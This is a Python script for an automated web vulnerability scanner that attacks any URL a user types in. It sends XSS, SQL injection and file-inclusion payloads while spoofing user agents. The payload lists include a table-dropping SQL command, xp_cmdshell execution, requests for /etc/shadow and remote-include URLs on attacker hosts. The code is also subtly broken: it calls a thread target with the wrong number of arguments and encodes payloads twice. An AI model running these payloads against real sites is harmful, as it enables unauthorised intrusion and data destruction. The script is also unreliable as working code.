import urllib.parse
import requests
from requests.exceptions import RequestException
import threading
import string
import random
import logging
import colorama
from colorama import Fore, Style
from fake_useragent import UserAgent

ua = UserAgent()

colorama.init(autoreset=True)
LOG_FORMAT = f"{Fore.BLUE}[%(asctime)s]{Style.RESET_ALL} %(levelname)s: %(message)s"

logging.basicConfig(
    level=logging.DEBUG,
    format=LOG_FORMAT
)

PAYLOADS = [
    '<script>alert("XSS Attack")</script>',
    '<img src="x" onerror="alert(\'XSS Attack\')">',
    '<a href="javascript:alert(\'XSS Attack\')">Click Here</a>',
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input type='text' value='XSS' onfocus='alert(\"XSS\");'>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>XSS Test</marquee>",
    "<table background='javascript:alert(\"XSS\")'>",
    "<link rel='stylesheet' href='javascript:alert(\"XSS\")'>",
    "<style>@import 'javascript:alert(\"XSS\")';</style>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<img src=x onerror=prompt('XSS')>",
    "<object data='javascript:alert(\"XSS\")'></object>",
    "<audio src='javascript:alert(\"XSS\")'></audio>",
    "<video src='javascript:alert(\"XSS\")'></video>",
    "<div style=width:expression(alert('XSS'))>XSS</div>",
    "'><script>alert(\"XSS\")</script>",
    "'\"><img src=x onerror=alert(\"XSS\")>",
    "`<script>alert(\"XSS\")</script>`",
    "<!--#exec cmd=\"/bin/bash -c 'echo XSS'\"-->",
    "%3Cscript%3Ealert(%27XSS%27)%3C/script%3E"  
]

SQL_PAYLOADS = [
    "' OR 1=1 --",
    "' UNION SELECT null, username, password FROM users --",
    "'; DROP TABLE users --",
    '" OR "a"="a',
    "'; SELECT * FROM information_schema.tables --",
    "' OR 'x'='x'",
    "' AND 1=2 UNION SELECT 1,2,3,4,5 --",
    "'; EXEC xp_cmdshell('dir') --",
    "'; WAITFOR DELAY '0:0:5' --",
    "admin' --",
    "admin' #",
    "' OR sleep(5) --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "' UNION SELECT NULL,NULL,NULL --",
    "'; SELECT @@version --"
]

RFI_PAYLOADS = [
    "http://attacker.com/malicious_file.php",
    "../../../../etc/passwd",
    "../../../Windows/System32/drivers/etc/hosts",
    "http://malicious-site.com/shell.php",
    "/var/www/html/config.php",
    "/proc/self/environ",
    "../../../boot.ini",
    "../../../../etc/shadow",
    "../../../../etc/security/passwd",
    "http://evil.com/code.php?cmd=id",
    "../../../../usr/local/apache2/conf/httpd.conf",
    "../../../../usr/local/etc/httpd/httpd.conf"
]

def user_agent():
    return {
        "User-Agent": ua.random,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    }

def check_website(url):
    try:
        response = requests.get(url, headers=user_agent())

        if response.status_code == 200:
            logging.info(f"{Fore.GREEN}[+] Website is reachable: {url}{Style.RESET_ALL}")
            return True
        
        elif response.status_code in [400, 403, 404]:
            logging.warning(f"{Fore.YELLOW}[!] Client-side issue detected ({response.status_code}): {url}{Style.RESET_ALL}")
        elif response.status_code >= 500:
            logging.error(f"{Fore.RED}[X] Server error ({response.status_code}): {url}{Style.RESET_ALL}")

    except RequestException as e:
        logging.error(f"{Fore.RED}[X] Failed to connect to {url}: {e}{Style.RESET_ALL}")
    
    return False

def check_xss(url):

    if not check_website(url):
        return
    vulnerable = []

    for payload in PAYLOADS:
        encoded_payload = urllib.parse.quote(payload)

        try:
            response = requests.get(url, params={'search': encoded_payload}, headers=user_agent(), timeout=10)

            if payload in response.text:
                logging.info(f"{Fore.GREEN}[+] XSS Vulnerability found at {url} with payload: {payload}{Style.RESET_ALL}")
                vulnerable.append(payload)
        
        except RequestException as e:
            logging.error(f"{Fore.RED}[!] Error during XSS check on {url}: {e}{Style.RESET_ALL}")

        if vulnerable:
            with open("xss_results.txt", "a") as file:
                file.write(f"Vulnerable URL: {url}\n")
                file.write("Payloads: \n" + "\n".join(vulnerable) + "\n\n")
            logging.info(f"{Fore.GREEN}[+] Results saved to xss_results.txt{Style.RESET_ALL}")

def check_sql_injection(url):

    if not check_website(url):
        return
    vulnerable = []
    
    for payload in SQL_PAYLOADS:
        encoded_payload = urllib.parse.quote(payload)

        try:
            response = requests.get(url, params={'id': encoded_payload}, headers=user_agent(), timeout=10)

            error_patterns = ["SQL syntax", "Warning", "mysql_fetch", "mysqli", "PDOException"]
            if any(error in response.text for error in error_patterns):
                logging.info(f"{Fore.GREEN}[+] SQL Injection vulnerability found at {url} with payload: {payload}{Style.RESET_ALL}")
                vulnerable.append(payload)

        except RequestException as e:
            logging.error(f"{Fore.RED}[!] Error during SQL Injection check on {url}: {e}{Style.RESET_ALL}")

    if vulnerable:
        with open("sql_injection_results.txt", "a") as file:
            file.write(f"Vulnerable URL: {url}\n")
            file.write("Payloads: \n" + "\n".join(vulnerable) + "\n\n")
        logging.info(f"{Fore.GREEN}[+] Results saved to sql_injection_results.txt{Style.RESET_ALL}")

def check_rfi(url):
    if not check_website(url):
        return
    
    vulnerable = []

    for payload in RFI_PAYLOADS:
        encoded_payload = urllib.parse.quote(payload)

        try:
            response = requests.get(url, params={"file": encoded_payload}, headers=user_agent(), timeout=10)

            error_patterns = ["Warning", "failed to open stream", "include(", "require(", "fopen(", "file_get_contents("]
            if any(error in response.text for error in error_patterns):
                logging.info(f"{Fore.GREEN}[+] RFI Vulnerability found at {url} with payload: {payload}{Style.RESET_ALL}")
                vulnerable.append(payload)

        except RequestException as e:
            logging.error(f"{Fore.RED}[!] Error during RFI check on {url}: {e}{Style.RESET_ALL}")

    if vulnerable:
        with open("rfi_results.txt", "a") as file:
            file.write(f"Vulnerable URL: {url}\n")
            file.write("Payloads: \n" + "\n".join(vulnerable) + "\n\n")
        logging.info(f"{Fore.GREEN}[+] Results saved to rfi_results.txt{Style.RESET_ALL}")

def check_sensitive_files(url):
    if not check_website(url):
        return
    
    vulnerable_files = []
    sensitive_files = ["/robots.txt", "/.git", "/.env", "/debug", "/config.php"]

    for file in sensitive_files:
        full_url = urllib.parse.urljoin(url, file)

        try:
            response = requests.get(full_url, headers=user_agent(), timeout=10)

            if response.status_code == 200:
                logging.info(f"{Fore.GREEN}[+] Sensitive file found: {full_url}{Style.RESET_ALL}")
                vulnerable_files.append(full_url)

        except RequestException as e:
            logging.error(f"{Fore.RED}[!] Error accessing {full_url}: {e}{Style.RESET_ALL}")

    if vulnerable_files:
        with open("sensitive_files_results.txt", "a") as file:
            file.write(f"Vulnerable URL: {url}\n")
            file.write("Exposed Files:\n" + "\n".join(vulnerable_files) + "\n\n")
        logging.info(f"{Fore.GREEN}[+] Results saved to sensitive_files_results.txt{Style.RESET_ALL}")

def analyze_headers(url):
    if not check_website(url):
        return
    
    vulnerable_headers = []
    
    try:
        response = requests.head(url, headers=user_agent(), timeout=10)
        headers = response.headers
        logging.info(f"{Fore.BLUE}[+] Analyzing headers for {url}{Style.RESET_ALL}")

        header_checks = {
            "X-Content-Type-Options": "MIME-sniffing attacks",
            "Strict-Transport-Security": "MITM attacks",
            "X-Frame-Options": "clickjacking attacks",
            "X-XSS-Protection": "reflected XSS attacks"
        }

        for header, risk in header_checks.items():
            if header not in headers:
                logging.warning(f"{Fore.YELLOW}[!] Missing '{header}' header. This can expose the site to {risk}.{Style.RESET_ALL}")
                vulnerable_headers.append(header)

    except RequestException as e:
        logging.error(f"{Fore.RED}[!] Error analyzing headers for {url}: {e}{Style.RESET_ALL}")

    if vulnerable_headers:
        with open("header_analysis_results.txt", "a") as file:
            file.write(f"Vulnerable URL: {url}\n")
            file.write("Missing Headers:\n" + "\n".join(vulnerable_headers) + "\n\n")
        logging.info(f"{Fore.GREEN}[+] Results saved to header_analysis_results.txt{Style.RESET_ALL}")

def check_vulnerabilities(url):

    if not check_website(url):
        return
    
    vulnerable_pages = [
        "/admin", "/login", "/config", "/upload", "/backup", "/.git", "/wp-admin",
        "/admin.php", "/test.php", "/debug", "/readme.html", "/login.php"
    ]

    vulnerable_found = []
    threads = []

    for page in vulnerable_pages:
        full_url = urllib.parse.urljoin(url, page)
        logging.info(f"{Fore.BLUE}[+] Testing page: {full_url}{Style.RESET_ALL}")

        thread = threading.Thread(target=check_page_vulnerabilities, args=(full_url, vulnerable_found))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    if vulnerable_found:
        with open("vulnerabilities_results.txt", "a") as file:
            file.write(f"Vulnerable URL: {url}\n")
            file.write("Exposed Endpoints:\n" + "\n".join(vulnerable_found) + "\n\n")
        logging.info(f"{Fore.GREEN}[+] Results saved to vulnerabilities_results.txt{Style.RESET_ALL}")

    analyze_headers(url)
    check_sensitive_files(url)

def check_page_vulnerabilities(page_url):
    if not check_website(page_url):
        return

    try:
        response = requests.get(page_url, headers=user_agent(), timeout=10)

        if response.status_code == 200:
            logging.info(f"{Fore.GREEN}[+] Potential vulnerability found at: {page_url}{Style.RESET_ALL}")
            
            check_xss(page_url)
            check_sql_injection(page_url)
            check_rfi(page_url)

        elif response.status_code == 403:
            logging.warning(f"{Fore.YELLOW}[!] Access Forbidden (403) at: {page_url}. Possible protected page.{Style.RESET_ALL}")

        elif response.status_code in [301, 302]:
            logging.warning(f"{Fore.BLUE}[+] Page redirected at: {page_url}. This could indicate a security issue.{Style.RESET_ALL}")

    except RequestException as e:
        logging.error(f"{Fore.RED}[!] Error accessing {page_url}: {e}{Style.RESET_ALL}")

url = input("Enter website URL: ")
check_vulnerabilities(url)